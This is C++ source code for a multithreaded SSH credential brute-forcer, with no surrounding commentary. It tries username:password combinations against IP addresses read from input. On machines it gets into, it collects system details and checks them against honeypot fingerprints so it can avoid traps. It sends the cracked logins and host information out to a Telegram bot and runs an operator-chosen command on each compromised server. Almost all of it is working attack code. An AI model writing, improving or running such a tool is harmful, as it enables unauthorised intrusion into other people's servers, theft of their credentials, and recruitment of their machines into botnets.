#include <algorithm>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <map>
#include <queue>
#include <curl/curl.h>
#include <json/json.h>
#include <libssh/libssh.h>
#include <libssh/callbacks.h>
#include <condition_variable>
#include <future>

std::map<std::string, bool> ipMap;
std::mutex ipMutex;
std::mutex logMutex;
std::queue<std::string> messageQueue;
std::condition_variable cv;
bool done = false;

class Semaphore {
public:
    explicit Semaphore(int count = 0) : count(count) {}

    void release(int n = 1) {
        std::unique_lock<std::mutex> lock(mtx);
        count += n;
        for (int i = 0; i < n; ++i) {
            cv.notify_one();
        }
    }

    void acquire() {
        std::unique_lock<std::mutex> lock(mtx);
        cv.wait(lock, [this]() { return count > 0; });
        --count;
    }

private:
    std::mutex mtx;
    std::condition_variable cv;
    int count;
};

Semaphore semaphore(0);

struct IPAPIResponse {
    std::string org;
};

std::string fetchOrgInfo(const std::string& ip) {
    std::string command = "curl -sS https://ipapi.co/" + ip + "/json/";

    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        std::cerr << "Failed to execute command: " << command << std::endl;
        return "Error fetching org info";
    }

    std::ostringstream output;
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        output << buffer;
    }

    pclose(pipe);

    Json::Value jsonData;
    Json::Reader jsonReader;
    if (jsonReader.parse(output.str(), jsonData)) {
        return jsonData["org"].asString();
    }

    return "Error parsing JSON";
}

void sendTelegramMessage(const std::string& botToken, const std::string& chatID, const std::string& message) {
    std::string command = "curl -sS -X POST -H 'Content-Type: application/json' -d '{\"chat_id\":\"" + chatID + "\",\"text\":\"" + message + "\"}' https://api.telegram.org/bot" + botToken + "/sendMessage > /dev/null 2>&1";

    if (system(command.c_str()) == -1) {
        std::cerr << "Failed to send Telegram message" << std::endl;
    }
}

void telegramWorker(const std::string& botToken, const std::string& chatID) {
    while (true) {
        std::unique_lock<std::mutex> lock(logMutex);
        cv.wait(lock, [] { return !messageQueue.empty() || done; });

        while (!messageQueue.empty()) {
            std::string message = messageQueue.front();
            messageQueue.pop();
            lock.unlock();
            sendTelegramMessage(botToken, chatID, message);
            lock.lock();
        }

        if (done) break;
    }
}

std::string runCommand(ssh_session session, const std::string& cmd) {
    ssh_channel channel = ssh_channel_new(session);
    if (channel == NULL) {
        std::cerr << "Error creating SSH channel\n";
        return "";
    }

    int rc = ssh_channel_open_session(channel);
    if (rc != SSH_OK) {
        std::cerr << "Error opening SSH channel\n";
        ssh_channel_free(channel);
        return "";
    }

    rc = ssh_channel_request_exec(channel, cmd.c_str());
    if (rc != SSH_OK) {
        std::cerr << "Error executing command: " << cmd << "\n";
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return "";
    }

    std::string output;
    char buffer[256];
    int nbytes;

    while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
        output.append(buffer, nbytes);
        memset(buffer, 0, sizeof(buffer));
    }

    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);

    return output;
}

ssh_session createSSHSession(const std::string& ip, const std::string& port) {
    ssh_session session = ssh_new();
    if (session == NULL) {
        std::cerr << "Error creating SSH session\n";
        return NULL;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, ip.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT_STR, port.c_str());
    long timeout = 3;
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        std::cerr << "Error connecting to " << ip << ":" << port << ": " << ssh_get_error(session) << "\n";
        ssh_free(session);
        return NULL;
    }

    return session;
}

ssh_channel createSSHChannel(ssh_session session) {
    ssh_channel channel = ssh_channel_new(session);
    if (channel == NULL) {
        std::cerr << "Error creating SSH channel\n";
        return NULL;
    }

    int rc = ssh_channel_open_session(channel);
    if (rc != SSH_OK) {
        std::cerr << "Error opening SSH channel\n";
        ssh_channel_free(channel);
        return NULL;
    }

    return channel;
}

void destroySSHSession(ssh_session session) {
    if (session != NULL) {
        ssh_disconnect(session);
        ssh_free(session);
    }
}

void destroySSHChannel(ssh_channel channel) {
    if (channel != NULL) {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
    }
}

void handleSSHLogin(const std::string& ip, const std::string& port, const std::string& botToken, const std::string& chatID, 
                    const std::vector<std::string>& combos, const std::string& command) {
    for (const auto& combo : combos) {
        std::istringstream iss(combo);
        std::string user, pass;
        getline(iss, user, ':');
        getline(iss, pass, ':');

        ssh_session session = createSSHSession(ip, port);
        if (session == NULL) {
            std::cerr << "Failed to create SSH session\n";
            break;
        }

        int rc = ssh_userauth_password(session, NULL, pass.c_str());
        if (rc != SSH_AUTH_SUCCESS) {
            std::cerr << "Authentication failed for " << ip << ":" << port << " as " << user << ": " << ssh_get_error(session) << "\n";
            destroySSHSession(session);
            continue;
        }

        std::string echoCheck = runCommand(session, "echo nohello");
        if (echoCheck.find("nohello") == std::string::npos) {
            std::cerr << "Server did not respond with 'nohello'. Fake ass server.\n";
            destroySSHSession(session);
            break;
        }

        std::string uname = runCommand(session, "uname -a");
        std::string uptime = runCommand(session, "uptime");
        std::string cpuModel = runCommand(session, "cat /proc/cpuinfo | grep 'model name' | uniq");
        std::string processors = runCommand(session, "nproc");
        std::string gpu = runCommand(session, "lspci | grep -i vga");

        auto removeNewline = [](char c) { return c == '\n'; };
        uname.erase(std::remove_if(uname.begin(), uname.end(), removeNewline), uname.end());
        uptime.erase(std::remove_if(uptime.begin(), uptime.end(), removeNewline), uptime.end());
        cpuModel.erase(std::remove_if(cpuModel.begin(), cpuModel.end(), removeNewline), cpuModel.end());
        processors.erase(std::remove_if(processors.begin(), processors.end(), removeNewline), processors.end());
        gpu.erase(std::remove_if(gpu.begin(), gpu.end(), removeNewline), gpu.end());

        std::string orgInfo = fetchOrgInfo(ip);

        std::ostringstream loginInfoStream;
        loginInfoStream << "[ Login ] " << user << "@" << ip << " " << port << "\n";
        loginInfoStream << "[ Password ] " << pass << "\n";
        loginInfoStream << "[ Uname ] " << uname << "\n";
        loginInfoStream << "[ Uptime ] " << uptime << "\n";
        loginInfoStream << "[ CPU Model ] " << cpuModel << "\n";
        loginInfoStream << "[ Processors ] " << processors << "\n";
        loginInfoStream << "[ GPU ] " << gpu << "\n";
        loginInfoStream << "[ HOST ] " << orgInfo << "\n";

        std::string loginInfo = loginInfoStream.str();

        std::cout << loginInfo << std::endl;

        if (uname.find("Linux svr04") != std::string::npos ||
            uname.find("Linux nodorr") != std::string::npos ||
            uname.find("Linux ubuntu 3.2.0-4-amd64") != std::string::npos ||
            uname.find("Linux server 3.2.0-4-amd64") != std::string::npos ||
            uname.find("Linux root 3.2.0-4-amd64") != std::string::npos ||
            uname.find("Linux web 4.4.0-59-generic") != std::string::npos ||
            uname.find("3.2.0-4-amd64") != std::string::npos ||
            uname.find("Linux none") != std::string::npos ||
            cpuModel.find("i7-2960XM CPU") != std::string::npos ||
            cpuModel.find("i3-4005U CPU") != std::string::npos ||
            cpuModel.find("2 Duo CPU     E8200") != std::string::npos) {

            std::ofstream honeypotFile("honeypots.txt", std::ios_base::app);
            if (honeypotFile.is_open()) {
                honeypotFile << ip << "\n";
                honeypotFile.close();
            } else {
                std::cerr << "Failed to open honeypot file for writing\n";
            }
            destroySSHSession(session);
            break;
        }

        {
            std::lock_guard<std::mutex> lock(logMutex);
            std::ofstream logFile("scans.log", std::ios_base::app);
            if (logFile.is_open()) {
                logFile << loginInfo;
                logFile.close();
            } else {
                std::cerr << "Failed to open log file for writing\n";
            }
        }

        {
            std::lock_guard<std::mutex> lock(logMutex);
            messageQueue.push(loginInfo);
            cv.notify_one();
        }

        if (!command.empty()) {
            runCommand(session, command);
        }

        destroySSHSession(session);
        break;
    }
    semaphore.release();
}

void runThreadPool(const std::string& port, const std::string& remoteCommand, const std::string& botToken, const std::string& chatID, const std::vector<std::string>& combos, int numThreads) {
    semaphore.release(numThreads);

    std::string ip;

    std::cerr << "Reading IPs..." << std::endl;

    while (std::cin >> ip) {
        std::cerr << "Read IP: " << ip << std::endl;

        semaphore.acquire();
        std::thread([ip, port, botToken, chatID, combos, remoteCommand] {
            handleSSHLogin(ip, port, botToken, chatID, combos, remoteCommand);
        }).detach();
    }

    for (int i = 0; i < numThreads; ++i) {
        semaphore.acquire();
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " port threads remote-command" << std::endl;
        return 1;
    }

    std::string port = argv[1];
    int numThreads = std::stoi(argv[2]);
    std::string remoteCommand = argv[3];

    std::string botToken = "bot-token-here";
    std::string chatID = "chat-id-here";

    std::vector<std::string> combos;
    std::ifstream comboFile("combos.txt");
    std::string combo;
    while (std::getline(comboFile, combo)) {
        combos.push_back(combo);
    }

    std::thread telegramThread(telegramWorker, botToken, chatID);

    runThreadPool(port, remoteCommand, botToken, chatID, combos, numThreads);

    {
        std::lock_guard<std::mutex> lock(logMutex);
        done = true;
        cv.notify_one();
    }

    telegramThread.join();

    return 0;
}
